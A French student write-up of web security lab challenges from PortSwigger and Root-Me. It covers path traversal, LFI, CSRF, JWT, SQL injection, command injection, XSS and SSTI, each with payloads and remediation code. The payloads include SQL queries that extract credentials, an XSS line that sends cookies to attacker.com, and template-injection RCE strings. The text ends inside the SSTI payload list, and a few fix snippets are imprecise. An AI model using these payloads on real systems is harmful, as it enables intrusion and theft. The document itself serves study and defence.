# Documentation des Challenges de Sécurité Web

**Projet** : Sécurité Informatique - Partie 2
**Étudiant** : [Votre Nom]
**Date** : 2025-12-01

---

## Table des Matières

1. [Path Traversal - Null Byte Bypass](#challenge-1-path-traversal-null-byte-bypass)
2. [PHP Filters](#challenge-2-php-filters)
3. [CSRF - Contournement de Jeton](#challenge-3-csrf-contournement-de-jeton)
4. [CSRF - Token Not Tied to Session](#challenge-4-csrf-token-not-tied-to-session)
5. [CSRF - Referer Validation Bypass](#challenge-5-csrf-referer-validation-bypass)
6. [JWT - Jeton Révoqué](#challenge-6-jwt-jeton-révoqué)
7. [SQL Injection - Error Based](#challenge-7-sql-injection-error-based)
8. [Command Injection - Filter Bypass](#challenge-8-command-injection-filter-bypass)
9. [XSS Stockée 2](#challenge-9-xss-stockée-2)
10. [Server-Side Template Injection](#challenge-10-server-side-template-injection)
11. [API Mass Assignment](#challenge-11-api-mass-assignment)

---

## Challenge 1: Path Traversal - Null Byte Bypass

### 📋 Informations

- **Plateforme** : PortSwigger Web Security Academy
- **URL** : https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
- **Catégorie** : Path Traversal
- **Difficulté** : Intermédiaire

### 🔍 Étapes de Découverte

1. **Reconnaissance initiale**
   - Accès au laboratoire et observation de l'application
   - Identification d'une fonctionnalité de chargement d'images
   - URL observée : `/image?filename=exemple.jpg`

2. **Test de base**
   - Tentative de path traversal simple : `../../../etc/passwd`
   - Résultat : Erreur "Invalid file extension"
   - Conclusion : Validation de l'extension de fichier en place

3. **Analyse de la protection**
   - L'application vérifie que le fichier se termine par une extension autorisée (.jpg, .png, etc.)
   - Hypothèse : Validation basée sur la fin de la chaîne

4. **Exploitation avec Null Byte**
   - Test de l'injection d'un null byte (`%00`) pour tronquer la chaîne
   - Le null byte en URL encoding est `%00`
   - Construction du payload : `../../../etc/passwd%00.jpg`

5. **Validation**
   - Le serveur traite la chaîne jusqu'au null byte
   - L'extension `.jpg` après le null byte satisfait la validation
   - Le fichier `/etc/passwd` est retourné avec succès

### 💉 Payload Utilisé

```http
GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Explication du payload :**
- `../../../` : Remonte de 3 niveaux dans l'arborescence
- `etc/passwd` : Fichier cible contenant les utilisateurs système
- `%00` : Null byte qui termine la chaîne côté serveur
- `.jpg` : Extension valide pour bypasser la validation

### 📸 Screenshot

```
[INSÉRER ICI UN SCREENSHOT MONTRANT]
- L'URL avec le payload
- Le contenu du fichier /etc/passwd affiché
- La preuve de réussite du challenge
```

**Exemple de résultat attendu :**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

### 🛡️ Recommandations de Sécurisation

#### 1. Validation Stricte des Entrées
```php
// MAL : Validation faible
if (substr($filename, -4) === '.jpg') {
    // Vulnerable au null byte
}

// BIEN : Validation robuste
$allowed_extensions = ['jpg', 'png', 'gif'];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (!in_array($extension, $allowed_extensions)) {
    die('Extension non autorisée');
}

// Vérifier l'absence de null bytes
if (strpos($filename, "\0") !== false) {
    die('Caractère invalide détecté');
}
```

#### 2. Liste Blanche de Fichiers
```php
// Utiliser un mapping ID -> fichier
$allowed_files = [
    '1' => 'image1.jpg',
    '2' => 'image2.jpg',
    '3' => 'image3.jpg'
];

$file_id = $_GET['id'];
if (isset($allowed_files[$file_id])) {
    $filename = $allowed_files[$file_id];
} else {
    die('Fichier non trouvé');
}
```

#### 3. Utiliser des Fonctions Sécurisées
```php
// Obtenir le chemin canonique et vérifier qu'il est dans le dossier autorisé
$base_dir = realpath('/var/www/images/');
$file_path = realpath($base_dir . '/' . $filename);

if ($file_path === false || strpos($file_path, $base_dir) !== 0) {
    die('Accès refusé');
}
```

#### 4. Configuration Serveur
```apache
# Apache : Désactiver la gestion des null bytes
<Directory "/var/www/images">
    Options -Indexes -FollowSymLinks
    AllowOverride None
</Directory>
```

### 📚 Références

- **OWASP Path Traversal** : https://owasp.org/www-community/attacks/Path_Traversal
- **CWE-22: Improper Limitation of a Pathname** : https://cwe.mitre.org/data/definitions/22.html
- **PortSwigger Guide** : https://portswigger.net/web-security/file-path-traversal
- **PHP Security** : https://www.php.net/manual/en/security.filesystem.nullbytes.php

---

## Challenge 2: PHP Filters

### 📋 Informations

- **Plateforme** : Root-Me
- **URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters
- **Catégorie** : Local File Inclusion (LFI)
- **Difficulté** : Facile

### 🔍 Étapes de Découverte

1. **Reconnaissance**
   - Page avec paramètre : `?page=accueil`
   - Test de fichiers : `?page=../../../etc/passwd` (bloqué)
   - Hypothèse : Filtre anti-traversal en place

2. **Test des wrappers PHP**
   - PHP permet l'utilisation de wrappers de flux
   - Test du wrapper `php://filter`
   - Syntaxe : `php://filter/convert.base64-encode/resource=fichier`

3. **Exploitation**
   - Construction du payload pour lire le code source
   - Le base64 permet de contourner les filtres d'exécution PHP

### 💉 Payload Utilisé

```http
GET /?page=php://filter/convert.base64-encode/resource=index HTTP/1.1
Host: challenge01.root-me.org
```

**Décodage du résultat :**
```bash
# Copier le base64 obtenu
echo "PD9waHAg..." | base64 -d
```

### 📸 Screenshot

```
[INSÉRER ICI]
- La requête avec le payload
- Le résultat encodé en base64
- Le code source décodé montrant le flag
```

### 🛡️ Recommandations de Sécurisation

#### 1. Liste Blanche Stricte
```php
// VULNERABLE
$page = $_GET['page'];
include($page . '.php');

// SÉCURISÉ
$allowed_pages = ['accueil', 'contact', 'apropos'];
$page = $_GET['page'] ?? 'accueil';

if (in_array($page, $allowed_pages, true)) {
    include('pages/' . $page . '.php');
} else {
    header('HTTP/1.0 404 Not Found');
    include('pages/404.php');
}
```

#### 2. Désactiver les Wrappers Dangereux
```ini
; php.ini
allow_url_fopen = Off
allow_url_include = Off
```

#### 3. Validation Stricte
```php
// Valider que le nom ne contient que des caractères alphanumériques
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $page)) {
    die('Paramètre invalide');
}
```

### 📚 Références

- **PHP Wrappers** : https://www.php.net/manual/en/wrappers.php
- **OWASP LFI** : https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- **HackTricks LFI** : https://book.hacktricks.xyz/pentesting-web/file-inclusion

---

## Challenge 3: CSRF - Contournement de Jeton

### 📋 Informations

- **Plateforme** : Root-Me
- **URL** : https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton
- **Catégorie** : Cross-Site Request Forgery
- **Difficulté** : Intermédiaire

### 🔍 Étapes de Découverte

1. **Analyse de la fonctionnalité**
   - Formulaire de changement de mot de passe
   - Présence d'un token CSRF dans le formulaire
   - Token généré : `<input name="csrf_token" value="abc123...">`

2. **Test de la validation**
   - Soumission sans token : Rejeté
   - Soumission avec token invalide : Rejeté
   - Soumission avec token vide : Accepté ⚠️

3. **Identification de la vulnérabilité**
   - Le serveur vérifie le token seulement s'il est présent et non vide
   - Si le paramètre est omis ou vide, la validation est bypassée

### 💉 Payload Utilisé

```html
<!-- Page attaquante hébergée sur un serveur contrôlé -->
<html>
<body>
    <h1>Vous avez gagné un prix!</h1>
    <p>Cliquez ici pour le réclamer</p>

    <form id="csrf-form" action="https://challenge.root-me.org/change-password" method="POST">
        <input type="hidden" name="new_password" value="hacked123">
        <!-- Omettre le champ csrf_token -->
    </form>

    <script>
        // Auto-soumission du formulaire
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

**Variante : Token vide**
```html
<form action="..." method="POST">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="new_password" value="hacked123">
</form>
```

### 📸 Screenshot

```
[INSÉRER ICI]
- Le formulaire original avec le token
- La page attaquante avec le formulaire CSRF
- La preuve de changement de mot de passe
- Le flag obtenu
```

### 🛡️ Recommandations de Sécurisation

#### 1. Validation Stricte du Token
```php
// VULNERABLE
if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // Traiter la requête
}

// SÉCURISÉ
if (!isset($_POST['csrf_token']) ||
    empty($_POST['csrf_token']) ||
    $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('Token CSRF invalide');
}

// Encore mieux : utiliser hash_equals pour éviter le timing attack
if (!isset($_POST['csrf_token']) ||
    !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('Token CSRF invalide');
}
```

#### 2. Token Par Session
```php
// Génération du token
session_start();
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Dans le formulaire
echo '<input type="hidden" name="csrf_token" value="' .
     htmlspecialchars($_SESSION['csrf_token']) . '">';
```

#### 3. SameSite Cookie
```php
// Configurer les cookies de session avec SameSite
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

#### 4. Vérification du Referer (défense en profondeur)
```php
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$expected_host = 'https://example.com';

if (strpos($referer, $expected_host) !== 0) {
    die('Referer invalide');
}
```

### 📚 Références

- **OWASP CSRF** : https://owasp.org/www-community/attacks/csrf
- **OWASP CSRF Prevention** : https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **MDN SameSite** : https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite

---

## Challenge 4: CSRF - Token Not Tied to Session

### 📋 Informations

- **Plateforme** : PortSwigger Web Security Academy
- **URL** : https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
- **Catégorie** : CSRF
- **Difficulté** : Intermédiaire

### 🔍 Étapes de Découverte

1. **Analyse du mécanisme**
   - Fonctionnalité de changement d'email
   - Token CSRF présent dans le formulaire
   - Test avec token invalide : Rejeté

2. **Test multi-comptes**
   - Connexion avec compte A : token_A généré
   - Connexion avec compte B : token_B généré
   - Utilisation de token_A avec session de B : Accepté ⚠️

3. **Vulnérabilité identifiée**
   - Le token est validé globalement, pas par session
   - Un attaquant peut utiliser son propre token valide pour attaquer d'autres utilisateurs

### 💉 Payload Utilisé

```html
<!-- 1. L'attaquant obtient son propre token CSRF valide -->
<!-- Token de l'attaquant : "a1b2c3d4e5f6..." -->

<!-- 2. Page attaquante -->
<html>
<body>
    <form id="csrf-form" action="https://vulnerable-site.com/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
        <!-- Utilisation du token de l'attaquant -->
        <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6...">
    </form>

    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

### 📸 Screenshot

```
[INSÉRER ICI]
- Connexion avec deux comptes différents
- Démonstration que le token d'un compte fonctionne pour l'autre
- Email changé avec succès
- Flag obtenu
```

### 🛡️ Recommandations de Sécurisation

#### 1. Lier le Token à la Session
```php
// Génération du token lié à la session
session_start();

$session_id = session_id();
$random_token = bin2hex(random_bytes(32));
$csrf_token = hash_hmac('sha256', $session_id, $random_token);

$_SESSION['csrf_token'] = $csrf_token;
$_SESSION['csrf_random'] = $random_token;

// Validation
function validate_csrf_token($token) {
    if (!isset($_SESSION['csrf_token']) || !isset($_SESSION['csrf_random'])) {
        return false;
    }

    $expected = hash_hmac('sha256', session_id(), $_SESSION['csrf_random']);
    return hash_equals($expected, $token);
}
```

#### 2. Token Par Utilisateur
```php
// Génération incluant l'ID utilisateur
$user_id = $_SESSION['user_id'];
$csrf_token = hash_hmac('sha256', $user_id . session_id(), SECRET_KEY);

// Validation
function validate_csrf($token) {
    $user_id = $_SESSION['user_id'];
    $expected = hash_hmac('sha256', $user_id . session_id(), SECRET_KEY);
    return hash_equals($expected, $token);
}
```

#### 3. Framework Moderne
```php
// Utiliser un framework qui gère automatiquement le CSRF
// Exemple avec Symfony
use Symfony\Component\Security\Csrf\CsrfTokenManager;

$tokenManager = new CsrfTokenManager();
$token = $tokenManager->getToken('change_email')->getValue();

// Validation automatique liée à la session
```

### 📚 Références

- **PortSwigger CSRF Tokens** : https://portswigger.net/web-security/csrf/tokens
- **OWASP Session Management** : https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

---

## Challenge 5: CSRF - Referer Validation Bypass

### 📋 Informations

- **Plateforme** : PortSwigger Web Security Academy
- **URL** : https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
- **Catégorie** : CSRF
- **Difficulté** : Facile

### 🔍 Étapes de Découverte

1. **Analyse de la protection**
   - Pas de token CSRF
   - Protection basée sur le header Referer
   - Test avec Referer externe : Rejeté

2. **Test de suppression du Referer**
   - Requête sans header Referer : Accepté ⚠️
   - Vulnérabilité : La validation ne se fait que si le Referer est présent

### 💉 Payload Utilisé

```html
<html>
<head>
    <!-- Empêcher l'envoi du header Referer -->
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <form id="csrf-form" action="https://vulnerable-site.com/change-email" method="POST">
        <input type="hidden" name="email" value="pwned@evil.com">
    </form>

    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

**Alternative avec iframe :**
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form id="csrf-form" action="..." method="POST" target="csrf-frame"
      referrerpolicy="no-referrer">
    <input type="hidden" name="email" value="pwned@evil.com">
</form>
```

### 📸 Screenshot

```
[INSÉRER ICI]
- Burp Suite montrant la requête sans Referer
- Réponse positive du serveur
- Email changé
- Challenge résolu
```

### 🛡️ Recommandations de Sécurisation

#### 1. Ne Jamais Utiliser Uniquement le Referer
```php
// MAL : Validation seulement si présent
if (isset($_SERVER['HTTP_REFERER'])) {
    if (!str_starts_with($_SERVER['HTTP_REFERER'], 'https://example.com')) {
        die('Referer invalide');
    }
}

// BIEN : Utiliser un token CSRF obligatoire
```

#### 2. Défense en Profondeur
```php
// Combiner plusieurs mécanismes
// 1. Token CSRF (principal)
validate_csrf_token($_POST['csrf_token']);

// 2. Referer (secondaire)
if (isset($_SERVER['HTTP_REFERER'])) {
    $referer = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
    if ($referer !== $_SERVER['HTTP_HOST']) {
        log_security_event('Invalid referer');
        die('Accès refusé');
    }
}

// 3. Origin (secondaire)
if (isset($_SERVER['HTTP_ORIGIN'])) {
    $origin = parse_url($_SERVER['HTTP_ORIGIN'], PHP_URL_HOST);
    if ($origin !== $_SERVER['HTTP_HOST']) {
        die('Accès refusé');
    }
}

// 4. SameSite Cookie
// Déjà configuré au niveau des cookies de session
```

#### 3. Utiliser SameSite=Strict
```php
session_set_cookie_params([
    'samesite' => 'Strict',  // Ou 'Lax' selon les besoins
    'secure' => true,
    'httponly' => true
]);
```

### 📚 Références

- **OWASP CSRF Defense** : https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **MDN Referer Policy** : https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy

---

## Challenge 6: JWT - Jeton Révoqué

### 📋 Informations

- **Plateforme** : Root-Me
- **URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque
- **Catégorie** : JSON Web Token
- **Difficulté** : Intermédiaire

### 🔍 Étapes de Découverte

1. **Analyse du JWT**
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
   eyJ1c2VyIjoidXNlciIsImV4cCI6MTYxMjM0NTY3OH0.
   signature
   ```

2. **Décodage**
   - Header : `{"alg":"HS256","typ":"JWT"}`
   - Payload : `{"user":"user","exp":1612345678}`
   - Pas de liste de révocation côté client

3. **Tentative de réutilisation d'un token révoqué**
   - Connexion et déconnexion
   - Réutilisation du token après déconnexion : Accepté ⚠️

### 💉 Payload Utilisé

```bash
# 1. Obtenir un token valide
curl -X POST https://challenge.root-me.org/login \
  -d "username=user&password=pass" \
  -c cookies.txt

# 2. Se déconnecter (révocation du token)
curl https://challenge.root-me.org/logout \
  -b cookies.txt

# 3. Réutiliser le token révoqué
curl https://challenge.root-me.org/admin \
  -H "Authorization: Bearer eyJhbGci..." \
  -b cookies.txt
```

**Manipulation avec jwt.io :**
- Modifier le payload pour élever les privilèges
- Exemple : `{"user":"admin","role":"admin"}`

### 📸 Screenshot

```
[INSÉRER ICI]
- Token décodé sur jwt.io
- Requête avec token révoqué qui fonctionne
- Accès admin obtenu
- Flag récupéré
```

### 🛡️ Recommandations de Sécurisation

#### 1. Liste de Révocation (Token Blacklist)
```python
# Redis pour stocker les tokens révoqués
import redis
from datetime import datetime, timedelta

redis_client = redis.Redis()

def revoke_token(token_jti, exp_timestamp):
    """Ajouter le token à la blacklist"""
    ttl = exp_timestamp - datetime.now().timestamp()
    redis_client.setex(f"revoked:{token_jti}", int(ttl), "1")

def is_token_revoked(token_jti):
    """Vérifier si le token est révoqué"""
    return redis_client.exists(f"revoked:{token_jti}")

# Validation
if is_token_revoked(claims['jti']):
    abort(401, "Token révoqué")
```

#### 2. Tokens de Courte Durée + Refresh Tokens
```python
# Access token : 15 minutes
access_token = create_access_token(
    identity=user_id,
    expires_delta=timedelta(minutes=15)
)

# Refresh token : 30 jours (stocké en base)
refresh_token = create_refresh_token(
    identity=user_id,
    expires_delta=timedelta(days=30)
)

# Stocker le refresh token en base
db.session.add(RefreshToken(
    token=hash(refresh_token),
    user_id=user_id,
    expires_at=datetime.now() + timedelta(days=30)
))
```

#### 3. JTI (JWT ID) Unique
```python
import uuid
from jose import jwt

def create_token(user_id):
    payload = {
        'user_id': user_id,
        'jti': str(uuid.uuid4()),  # Identifiant unique
        'exp': datetime.now() + timedelta(hours=1),
        'iat': datetime.now()
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')
```

#### 4. Audit Log
```python
def log_token_usage(token_jti, user_id, action):
    """Logger toute utilisation de token"""
    db.session.add(TokenAudit(
        jti=token_jti,
        user_id=user_id,
        action=action,
        timestamp=datetime.now(),
        ip=request.remote_addr
    ))
```

### 📚 Références

- **JWT Best Practices** : https://datatracker.ietf.org/doc/html/rfc8725
- **OWASP JWT Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- **JWT.io** : https://jwt.io/

---

## Challenge 7: SQL Injection - Error Based

### 📋 Informations

- **Plateforme** : Root-Me
- **URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error
- **Catégorie** : SQL Injection
- **Difficulté** : Facile

### 🔍 Étapes de Découverte

1. **Identification du point d'injection**
   - Champ de recherche ou paramètre d'URL
   - Test avec `'` : Erreur SQL affichée

2. **Analyse de l'erreur**
   ```
   You have an error in your SQL syntax; check the manual that
   corresponds to your MySQL server version for the right syntax
   ```

3. **Extraction via messages d'erreur**
   - Utilisation de fonctions qui provoquent des erreurs informatives
   - Technique : EXTRACTVALUE, UPDATEXML

### 💉 Payload Utilisé

```sql
-- Test d'injection
' OR 1=1--

-- Extraction du nom de la base de données via erreur
' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))--

-- Extraction des tables
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name)
  FROM information_schema.tables WHERE table_schema=DATABASE()), 0x7e))--

-- Extraction des colonnes
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name)
  FROM information_schema.columns WHERE table_name='users'), 0x7e))--

-- Extraction des données
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username,0x3a,password)
  FROM users), 0x7e))--
```

**Alternative avec UPDATEXML :**
```sql
' AND UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 1)--
```

### 📸 Screenshot

```
[INSÉRER ICI]
- Requête avec le payload
- Message d'erreur contenant les données
- Flag extrait
```

### 🛡️ Recommandations de Sécurisation

#### 1. Utiliser des Requêtes Préparées
```php
// VULNERABLE
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
$result = mysqli_query($conn, $query);

// SÉCURISÉ
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $_GET['user']);
$stmt->execute();
$result = $stmt->get_result();
```

#### 2. Désactiver l'Affichage des Erreurs
```php
// php.ini en production
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log

// Dans le code
ini_set('display_errors', 0);
error_reporting(0);

// Gestion personnalisée des erreurs
try {
    $result = $stmt->execute();
} catch (Exception $e) {
    error_log('Database error: ' . $e->getMessage());
    die('Une erreur est survenue');
}
```

#### 3. Validation des Entrées
```php
// Valider le format attendu
if (!ctype_alnum($_GET['user'])) {
    die('Caractères invalides');
}

// Limiter la longueur
if (strlen($_GET['user']) > 50) {
    die('Entrée trop longue');
}
```

#### 4. Principe du Moindre Privilège
```sql
-- Créer un utilisateur avec permissions limitées
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON database.users TO 'webapp'@'localhost';
-- Ne pas donner accès à information_schema
FLUSH PRIVILEGES;
```

### 📚 Références

- **OWASP SQL Injection** : https://owasp.org/www-community/attacks/SQL_Injection
- **OWASP SQL Injection Prevention** : https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **MySQL Security** : https://dev.mysql.com/doc/refman/8.0/en/security-guidelines.html

---

## Challenge 8: Command Injection - Filter Bypass

### 📋 Informations

- **Plateforme** : Root-Me
- **URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre
- **Catégorie** : Command Injection
- **Difficulté** : Intermédiaire

### 🔍 Étapes de Découverte

1. **Identification**
   - Fonction ping ou similaire
   - Input utilisateur exécuté dans une commande système

2. **Test de base**
   ```
   127.0.0.1; ls
   127.0.0.1 && whoami
   ```
   Résultat : Filtré

3. **Analyse des filtres**
   - `;`, `&&`, `|`, `||` sont bloqués
   - Espaces filtrés
   - Caractères spéciaux limités

4. **Techniques de bypass**
   - Utilisation de caractères alternatifs
   - Encodage

### 💉 Payload Utilisé

```bash
# Bypass avec newline (%0a)
127.0.0.1%0als

# Bypass avec substitution
127.0.0.1`ls`

# Bypass d'espaces avec ${IFS}
127.0.0.1%0acat${IFS}/etc/passwd

# Bypass avec tabs
127.0.0.1%09cat%09/etc/passwd

# Bypass avec variables
a=l;b=s;$a$b

# Bypass avec brace expansion
127.0.0.1%0a{cat,/etc/passwd}

# Wildcard bypass
/???/??t /???/p??swd

# Encodage hexadécimal
127.0.0.1%0a$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 📸 Screenshot

```
[INSÉRER ICI]
- Payload envoyé
- Résultat de la commande injectée
- Flag obtenu
```

### 🛡️ Recommandations de Sécurisation

#### 1. Ne Jamais Exécuter de Commandes Shell
```php
// TRÈS MAUVAIS
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);

// MOINS MAUVAIS (mais toujours à éviter)
$ip = escapeshellarg($_GET['ip']);
$output = shell_exec("ping -c 4 " . $ip);

// BIEN : Utiliser des fonctions natives
function ping_host($host) {
    // Validation stricte
    if (!filter_var($host, FILTER_VALIDATE_IP)) {
        return false;
    }

    // Utiliser une bibliothèque ou une fonction native
    $socket = @fsockopen($host, 80, $errno, $errstr, 5);
    if ($socket) {
        fclose($socket);
        return true;
    }
    return false;
}
```

#### 2. Validation Stricte
```php
function validate_ip($ip) {
    // IPv4
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        return $ip;
    }

    // IPv6
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        return $ip;
    }

    throw new Exception('IP invalide');
}

// Utilisation
try {
    $safe_ip = validate_ip($_GET['ip']);
    // Utiliser $safe_ip de manière sécurisée
} catch (Exception $e) {
    die('Erreur de validation');
}
```

#### 3. Liste Blanche
```php
// Si vous devez absolument exécuter des commandes
$allowed_commands = [
    'status' => '/usr/bin/systemctl status nginx',
    'list' => '/usr/bin/ls /var/www',
];

$cmd = $_GET['cmd'];
if (isset($allowed_commands[$cmd])) {
    $output = shell_exec($allowed_commands[$cmd]);
} else {
    die('Commande non autorisée');
}
```

#### 4. Sandboxing
```php
// Utiliser des conteneurs ou chroot
// Docker example
docker run --rm --network none --read-only alpine ping -c 1 $IP
```

### 📚 Références

- **OWASP Command Injection** : https://owasp.org/www-community/attacks/Command_Injection
- **Command Injection Prevention** : https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- **HackTricks Command Injection** : https://book.hacktricks.xyz/pentesting-web/command-injection

---

## Challenge 9: XSS Stockée 2

### 📋 Informations

- **Plateforme** : Root-Me
- **URL** : https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2
- **Catégorie** : Cross-Site Scripting
- **Difficulté** : Intermédiaire

### 🔍 Étapes de Découverte

1. **Identification**
   - Champ de commentaire ou message
   - Contenu affiché à d'autres utilisateurs

2. **Test basique**
   ```html
   <script>alert('XSS')</script>
   ```
   Résultat : Filtré ou encodé

3. **Analyse des filtres**
   - Balises `<script>` bloquées
   - Certains attributs HTML autorisés

4. **Bypass avec événements**

### 💉 Payload Utilisé

```html
<!-- Event handlers -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Sans parenthèses -->
<img src=x onerror=alert`XSS`>

<!-- Bypass de filtres -->
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpCg=='))">

<!-- Exfiltration de données -->
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

<!-- Balises moins courantes -->
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

<!-- Bypass avec encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>

<!-- Contournement de mots-clés filtrés -->
<img src=x onerror="window['ale'+'rt']('XSS')">
```

### 📸 Screenshot

```
[INSÉRER ICI]
- Payload inséré dans le formulaire
- XSS déclenché
- Alerte affichée ou données exfiltrées
- Flag récupéré
```

### 🛡️ Recommandations de Sécurisation

#### 1. Encodage de Sortie
```php
// Pour affichage dans HTML
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// Pour affichage dans attributs HTML
echo htmlspecialchars($user_input, ENT_QUOTES | ENT_HTML5, 'UTF-8');

// Pour affichage dans JavaScript
function js_escape($string) {
    return json_encode($string, JSON_HEX_TAG | JSON_HEX_AMP |
                                JSON_HEX_APOS | JSON_HEX_QUOT);
}
```

#### 2. Content Security Policy
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';");
```

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; object-src 'none';">
```

#### 3. Sanitization (Bibliothèque)
```php
// Utiliser HTML Purifier
require_once 'HTMLPurifier.auto.php';

$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'p,b,i,strong,em,a[href],ul,ol,li');
$purifier = new HTMLPurifier($config);

$clean_html = $purifier->purify($dirty_html);
```

```python
# Python avec bleach
import bleach

allowed_tags = ['p', 'b', 'i', 'strong', 'em', 'a']
allowed_attributes = {'a': ['href']}

clean_html = bleach.clean(
    user_input,
    tags=allowed_tags,
    attributes=allowed_attributes,
    strip=True
)
```

#### 4. Framework Modern
```javascript
// React (auto-escape par défaut)
function Comment({ text }) {
    return <div>{text}</div>;  // Automatiquement échappé
}

// Si vous devez vraiment afficher du HTML
function RichComment({ html }) {
    // Sanitizer d'abord avec DOMPurify
    const clean = DOMPurify.sanitize(html);
    return <div dangerouslySetInnerHTML={{__html: clean}} />;
}
```

### 📚 Références

- **OWASP XSS** : https://owasp.org/www-community/attacks/xss/
- **OWASP XSS Prevention** : https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **DOMPurify** : https://github.com/cure53/DOMPurify
- **HTML Purifier** : http://htmlpurifier.org/

---

## Challenge 10: Server-Side Template Injection

### 📋 Informations

- **Plateforme** : PortSwigger Web Security Academy
- **URL** : https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit
- **Catégorie** : SSTI
- **Difficulté** : Avancée

### 🔍 Étapes de Découverte

1. **Identification du template engine**
   ```
   Test: {{7*7}}
   Résultat: 49 → Template engine détecté

   Test: ${7*7}
   Test: <%= 7*7 %>
   ```

2. **Fingerprinting**
   ```
   {{7*'7'}} → Résultat varie selon l'engine
   - Twig: 49
   - Jinja2: 7777777
   - Tornado: 49
   ```

3. **Exploitation**

### 💉 Payload Utilisé

```python
# Jinja2 (Python)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE
{{''.__class__.__mro__[1].__subclasses__()[414]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Simplified
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }

# Tornado (Python)
{% import os %}
{{ os.popen("ls").read() }}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= system("ls") %>
<%= `ls` %>
